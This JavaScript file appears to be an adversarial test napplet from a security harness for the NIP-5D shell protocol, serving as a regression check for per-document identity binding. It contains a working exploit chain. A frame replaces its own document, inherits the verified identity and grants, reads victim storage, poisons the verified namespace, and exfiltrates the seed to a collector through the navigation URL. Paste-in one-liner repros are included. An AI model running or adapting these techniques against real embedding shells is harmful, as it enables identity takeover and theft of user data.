// evil-09 — frame self-replacement & identity inheritance (tier 3, spec loophole).
// Pre-#14 NIP-5D mapped (dTag, artifactHash) — and every grant — to the iframe's
// Window reference. A Window survives same-frame navigation, and the injected
// meta CSP is per-document, so it dies with the verified document. This artifact
// proves the full chain: DETONATE replaces its own document with unverified
// stage-2 bytes that speak to the shell as the verified napplet.
// Fixed upstream by NIP-5D PR #14 (per-document MessagePort binding); this
// napplet + the harness `identity binding: port` knob are the regression gate.
window.__EVIL_KIT__ = [
  {
    label: 'second napplet.hello replay (post-#14 regression probe)',
    note: 'Paste into a napplet that has ALREADY handed off (or into a replacement document): a fixed shell MUST treat a second napplet.hello as replacement evidence — reject it, revoke the binding, remove the frame. A shell that accepts it has re-bound identity to attacker bytes and the #14 fix is broken. Pre-#14 shells have no hello at all — nothing to replay.',
    data: 'const ch = new MessageChannel();\nwindow.parent.postMessage({ type: "napplet.hello" }, "*", [ch.port2]);',
  },
  {
    label: 'minimal self-replacement repro (the one-liner this artifact detonates)',
    note: 'Any frame can navigate ITSELF — no sandbox token and no CSP fetch directive restricts it. In a Window-keyed shell the reply arrives carrying the verified napplet\'s grants: unverified bytes reading verified data. The injected meta CSP does not apply to the navigated document.',
    data: 'location.replace(\'data:text/html,<script>window.parent.postMessage({type:"storage.get",id:"repro",key:"victim-key"}, "*")<\\/script>\');',
  },
];

/* ---------- stage-2: the unverified replacement document ---------- */

function b64utf8(s) {
  const bytes = new TextEncoder().encode(s);
  let bin = '';
  for (let i = 0; i < bytes.length; i += 0x8000) {
    bin += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
  }
  return btoa(bin);
}

function stage2Html(cfg) {
  const json = JSON.stringify(cfg);
  return [
    '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>evil-09 stage-2</title>',
    '<style>',
    ':root { --bg:#120f16; --fg:#e9e6f2; --danger:#ff5470; --ok:#3fd68f; --warn:#ffb454; --muted:#8d88a3; --border:#3a3350; color-scheme: dark; font:12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }',
    'body { margin:0; background:var(--bg); color:var(--fg); padding:8px; user-select:text; }',
    '.banner { border:1px solid var(--danger); color:var(--danger); font-weight:700; padding:6px 8px; border-radius:6px; margin-bottom:8px; }',
    '.attack { border:1px solid var(--border); border-radius:6px; padding:8px; margin-bottom:6px; background:rgba(255,84,112,.05); }',
    '.attack.armed { border-color:rgba(255,84,112,.6); }',
    '.head { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }',
    '.name { font-weight:700; }',
    '.chip { border:1px solid var(--border); border-radius:4px; font-size:10px; text-transform:uppercase; letter-spacing:.04em; padding:1px 6px; white-space:nowrap; }',
    '.chip.armed { color:var(--danger); border-color:var(--danger); }',
    '.chip.blocked { color:var(--ok); border-color:var(--ok); }',
    '.chip.na { color:var(--muted); }',
    '.evidence { color:var(--muted); font-size:11px; margin-top:4px; overflow-wrap:anywhere; }',
    '#evilLog { border:1px solid var(--danger); border-radius:6px; padding:8px; font-size:11px; white-space:pre-wrap; margin-top:8px; }',
    '.note { color:var(--muted); font-size:11px; margin-top:8px; }',
    '</style></head><body>',
    '<div class="banner">&#9888; STAGE-2 — the replacement document. These bytes were NEVER verified against the manifest x tag. A Window-keyed shell still calls this frame (' + cfg.dTag + ', artifactHash).</div>',
    '<div id="rows"></div>',
    '<div id="evilLog" hidden></div>',
    '<div class="note">the verified napplet is gone — its UI died with the document it was bound to. Reload the napplet from the harness to restore it.</div>',
    '<script>',
    '"use strict";',
    'var C = ' + json + ';',
    'var VIA = location.protocol === "data:" ? "data:-url" : "document.open";',
    'function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;"); }',
    'function post(m) { try { window.parent.postMessage(m, "*"); } catch (_) {} }',
    'function row(id, name, st, ev) {',
    '  var d = document.createElement("div");',
    '  d.className = "attack" + (st === "armed" ? " armed" : "");',
    '  d.dataset.attack = id; d.dataset.status = st;',
    '  d.innerHTML = "<div class=\\"head\\"><span class=\\"chip " + st + "\\">" + (st === "armed" ? "ARMED" : st === "blocked" ? "HELD" : "N/A") + "</span><span class=\\"name\\">" + name + "</span></div>" +',
    '    "<div class=\\"evidence\\">" + ev + "</div>";',
    '  document.getElementById("rows").appendChild(d);',
    '}',
    'function fullReport() {',
    '  var out = { stage: "stage-2", mode: C.mode, via: VIA, rows: {} };',
    '  var els = document.querySelectorAll(".attack");',
    '  for (var i = 0; i < els.length; i++) out.rows[els[i].dataset.attack] = els[i].dataset.status;',
    '  return out;',
    '}',
    'function rawGet(key) {',
    '  return new Promise(function (res) {',
    '    var id = "s2-" + Math.random().toString(16).slice(2, 10);',
    '    var on = function (e) { var d = e.data; if (d && d.id === id) { window.removeEventListener("message", on); res(d); } };',
    '    window.addEventListener("message", on);',
    '    post({ type: "storage.get", id: id, key: key });',
    '    setTimeout(function () { window.removeEventListener("message", on); res(null); }, 2500);',
    '  });',
    '}',
    'function rawSet(key, value) {',
    '  return new Promise(function (res) {',
    '    var id = "s2-" + Math.random().toString(16).slice(2, 10);',
    '    var on = function (e) { var d = e.data; if (d && d.id === id) { window.removeEventListener("message", on); res(d); } };',
    '    window.addEventListener("message", on);',
    '    post({ type: "storage.set", id: id, key: key, value: value });',
    '    setTimeout(function () { window.removeEventListener("message", on); res(null); }, 2500);',
    '  });',
    '}',
    'row("replaced-document", "document replaced in-frame", "armed",',
    '  (VIA === "data:-url" ? "this document loaded from a data: URL — NOT the verified srcdoc bytes. " : "document.open() replaced the Document in-place — same Window, brand-new Document. ") +',
    '  "The iframe Window never changed, so a shell that maps (dTag, artifactHash) to the Window still treats these bytes as " + esc(C.dTag) + ".");',
    'post({ type: "evil.stage2.report", report: fullReport() }); /* preliminary — proves the replacement booted even under shells that drop everything after it */',
    'async function main() {',
    '  var r = await rawGet("__evil09_victim__");',
    '  if (r && r.value != null) {',
    '    row("grant-inheritance", "identity & grant inheritance", "armed",',
    '      "raw window-level storage.get from UNVERIFIED bytes was ACCEPTED and served from the VERIFIED napplet\\u2019s namespace: " + esc(String(r.value).slice(0, 32)) + " (" + String(r.value).length + " chars). The shell cannot tell this document from the artifact it verified.");',
    '  } else {',
    '    row("grant-inheritance", "identity & grant inheritance", "blocked",',
    '      "no reply to the raw window-level NAP request" + (r && r.error ? " (error: " + esc(r.error) + ")" : "") + " — the shell refused the replacement document. Identity did not survive the replacement.");',
    '  }',
    '  var evalHere = "blocked";',
    '  try { if (eval("2 + 2") === 4) evalHere = "open"; } catch (_) {}',
    '  if (evalHere === "open" && C.cspBefore === "blocked") {',
    '    row("csp-evaporation", "injected meta CSP evaporation", "armed",',
    '      "eval() was CSP-BLOCKED in the verified document, but it RUNS HERE — the injected meta CSP died with the verified document; this one has none. Every evil-02 egress channel re-opens for replacement bytes.");',
    '  } else if (evalHere === "open") {',
    '    row("csp-evaporation", "injected meta CSP evaporation", "na",',
    '      "eval() runs here, but the verified document had no CSP injected either (csp knob off) — evaporation unprovable in this run; detonate with the CSP meta on.");',
    '  } else {',
    '    row("csp-evaporation", "injected meta CSP evaporation", "blocked",',
    '      "eval() is still blocked in this replacement document (the original CSP carried over) — but see grant inheritance for what still leaked.");',
    '  }',
    '  var carried = false;',
    '  if (VIA === "data:-url") {',
    '    try {',
    '      var m = String(location.href).match(/,([^?#]+)/);',
    '      var decoded = m ? atob(m[1]) : "";',
    '      carried = !!C.marker && decoded.indexOf(C.marker) > -1;',
    '    } catch (_) {}',
    '  }',
    '  if (carried) {',
    '    row("url-disclosure", "navigation-URL data disclosure", "armed",',
    '      "decoded this frame\\u2019s own data: URL and found the marker the verified document encoded before navigating: " + esc(String(C.marker).slice(0, 48)) + " — the data crossed the document boundary inside the navigation URL, the only channel that did. Had this been an https://attacker/ URL, the same location assignment would have delivered it to the network — no CSP directive governs a frame navigating itself, and post-#14 revocation cannot recall what the URL already carried.");',
    '  } else {',
    '    row("url-disclosure", "navigation-URL data disclosure", "na", "no marker carried in the URL (" + VIA + " replacement — the data crossed via the in-place write instead)");',
    '  }',
    '  post({ type: "evil.stage2.report", report: fullReport() });',
    '  if (C.mode === "evil") {',
    '    var log = document.getElementById("evilLog");',
    '    log.hidden = false;',
    '    function line(s) { log.textContent += "[" + new Date().toISOString() + "] " + s + "\\n"; }',
    '    line("VERY EVIL stage-2 executing from UNVERIFIED bytes as " + C.dTag);',
    '    var pr = await rawSet("__evil09_poison__", "attacker-data-written-by-UNVERIFIED-bytes");',
    '    line("namespace poison: " + (pr && pr.value === true ? "WROTE __evil09_poison__ into the verified napplet\\u2019s namespace — the next legit load inherits it" : "refused/dropped (" + (pr && pr.error ? pr.error : "no reply") + ") — the runtime holds"));',
    '    line("navigation-URL exfil: " + C.collector + "?ev=evil09-nav-exfil&d=<data>");',
    '    line("finished. everything above actually happened.");',
    '    post({ type: "evil.stage2.report", report: fullReport() });',
    '    setTimeout(function () { location.href = C.collector + "?ev=evil09-nav-exfil&d=" + encodeURIComponent(C.data || "no-data"); }, 1200);',
    '  }',
    '}',
    'main();',
    '<\/script></body></html>',
  ].join('\n');
}

async function detonate(mode) {
  // data this napplet was LEGITIMATELY given (through the injected domain)
  let seed = null;
  const st = window.napplet && window.napplet.storage;
  if (st) {
    try {
      const v = await withTimeout(st.get('__evil09_victim__'), 2000);
      if (v && v !== 'timeout' && !v.__rejected) seed = String(v);
    } catch (_) { /* no seed readable */ }
  }
  // was the verified document CSP'd? (to prove evaporation in stage-2)
  let cspBefore = 'none';
  try { eval('1'); cspBefore = 'open'; } catch (_) { cspBefore = 'blocked'; }
  const cfg = {
    mode: mode,
    dTag: window.__EVIL_ID__,
    cspBefore: cspBefore,
    marker: '__evil09_marker__=' + (mode === 'evil' ? 'armed' : 'demo'),
    data: mode === 'evil' && seed ? seed : 'demo-marker-no-real-data',
    collector: state.collector,
  };
  const html = stage2Html(cfg);
  const dataUrl = 'data:text/html;base64,' + b64utf8(html);
  // PRIMARY: network replacement — the realistic attack. A page fetched over
  // http(s) arrives with its own (attacker-chosen, i.e. absent) CSP: the
  // injected meta died with the verified document. document.referrer is the
  // shell URL (the evil-01 finding), so the fixture on the harness origin
  // stands in for the attacker's server. No directive governs this navigation.
  let target = null;
  try {
    const ref = new URL(document.referrer);
    if (ref.protocol === 'http:' || ref.protocol === 'https:') {
      target = ref.origin + '/harness/replace-target.html'
        + '?marker=' + encodeURIComponent(cfg.marker)
        + '&mode=' + cfg.mode
        + '&csp=' + cfg.cspBefore
        + '&dTag=' + encodeURIComponent(cfg.dTag)
        + (mode === 'evil' ? '&collector=' + encodeURIComponent(cfg.collector) + '&data=' + encodeURIComponent(cfg.data) : '');
    }
  } catch (_) { /* no usable referrer origin — foreign runtime: scheme-local fallback */ }
  try { location.replace(target || dataUrl); } catch (_) { /* watchdog below */ }
  // FALLBACKS: same-frame navigation to a data: URL (unverified bytes, same
  // Window; note Chromium carries the policy container here, so the CSP may
  // survive this path), then in-place Document replacement (document.open).
  setTimeout(function () {
    if (location.protocol === 'data:' || /replace-target\.html/.test(String(location.href))) return;
    try { location.replace(dataUrl); } catch (_) { /* held */ }
    setTimeout(function () {
      if (location.protocol !== 'data:') {
        try { document.open(); document.write(html); document.close(); } catch (_) { /* held */ }
      }
    }, 600);
  }, 800);
  // stage-2 carries the report from here; this UI dies with the verified document
  await new Promise(() => {});
}

const ATTACKS = [
  {
    id: 'window-keying',
    name: 'identity keyed to this Window',
    target: 'pre-#14 §Identity: "map the iframe\'s Window reference to (dTag, artifactHash)"',
    severity: 'critical',
    harm: 'A Window reference survives same-frame navigation. If the shell maps identity to the Window, ANY document that replaces this one — reload or attacker bytes — inherits the verified (dTag, artifactHash) and every grant attached to it.',
    evilBrief: 'Exfiltrates the victim seed this frame can legitimately read to the collector via fetch — the point is the shell cannot tell WHICH document is reading.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected NAP domain — no transport to observe');
      // passive transport sniff: ride a NORMAL storage roundtrip through the
      // injected namespace and watch whether the reply envelope arrives at
      // this window (pre-#14 window-level postMessage) or over a dedicated
      // port (post-#14 handoff — invisible here by design).
      const sniffed = await new Promise((resolve) => {
        let settled = false;
        const on = (e) => {
          const d = e.data;
          if (d && typeof d.type === 'string' && d.type.indexOf('.result') > -1) {
            settled = true;
            window.removeEventListener('message', on);
            resolve(d);
          }
        };
        window.addEventListener('message', on);
        let gotValue = null;
        Promise.resolve(st.get('__evil09_victim__')).then(
          (v) => { gotValue = v; setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve(null); } }, 80); },
          () => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve(null); } }
        );
        setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve(null); } }, 3000);
      });
      if (sniffed) {
        return armed('the NAP reply envelope (' + sniffed.type + ') arrived WINDOW-LEVEL at this frame — the shell routes (dTag, artifactHash) and every grant by MessageEvent.source, i.e. by this frame\'s WINDOW. A Window survives same-frame navigation: replace this document and ANY bytes inherit the verified identity. DETONATE the replacement row to watch it happen.');
      }
      return blocked('NAP roundtrip completed with NO window-level envelope — replies ride a dedicated port (post-#14 transport). A replacement document has no channel: identity is port-bound to the verified document.');
    },
    async evil() {
      const out = {};
      const st = window.napplet && window.napplet.storage;
      if (st) {
        try {
          const v = await withTimeout(st.get('__evil09_victim__'), 2000);
          if (v && v !== 'timeout' && !v.__rejected) out.victimSeed = String(v);
        } catch (e) { out.getError = errMsg(e); }
      }
      out.exfil = await sendToCollector('evil09-window-keying', { victimSeed: out.victimSeed || null, href: safeGet(() => location.href) });
      return out;
    },
  },
  {
    id: 'replacement-watch',
    name: 'replacement telemetry (second hello / load / port close)',
    target: 'post-#14 §Identity: revoke on replacement evidence',
    severity: 'info',
    harm: 'Without shell-side replacement telemetry, the Window-keyed mapping is indistinguishable from consent: the shell keeps serving the replacement document forever.',
    evilBrief: 'Claims the frame and posts the shell-log line to the collector — the real probe is the DETONATE row: watch which shells keep ACCEPTING and which log REVOKED.',
    async demo() {
      return na('unverifiable from inside the frame: replacement-watch is shell-side telemetry. A post-#14 shell must revoke on a second napplet.hello, any post-handoff window-level message, a second iframe load, or the port closing. DETONATE the replacement row and watch the shell log: window-keyed shells keep ACCEPTING from the replacement; port-bound shells log REVOKED and tear the frame down.');
    },
    async evil() {
      const out = { note: 'shell-side flaw — see the DETONATE row. This claim-exfil proves the channel, the detonation proves the inheritance' };
      out.exfil = await sendToCollector('evil09-claim', { dTag: window.__EVIL_ID__, href: safeGet(() => location.href) });
      return out;
    },
  },
  {
    id: 'self-replace',
    name: 'frame self-replacement → identity & grant inheritance',
    target: 'pre-#14 §Identity Window mapping + §Security CSP advisory (meta CSP is per-document)',
    severity: 'critical',
    autoRun: false,
    destructive: true,
    harm: 'Sandbox allow-scripts does not stop a frame from navigating ITSELF, and no CSP fetch directive governs it. The verified document is replaced in-place by unverified attacker bytes in the same Window: they inherit (dTag, artifactHash) and every grant, and the injected meta CSP dies with the verified document. Total identity takeover with zero escape required.',
    evilBrief: 'DETONATES: navigates this frame to an unverified stage-2 document carrying the victim seed it legitimately read. Stage-2 then POISONS the verified napplet\'s storage namespace (__evil09_poison__ for the next legit load to inherit) and EXFILTRATES the seed to the collector via the navigation URL itself — CSP cannot stop a location assignment.',
    demo() { return detonate('demo'); },
    evil() { return detonate('evil'); },
  },
];
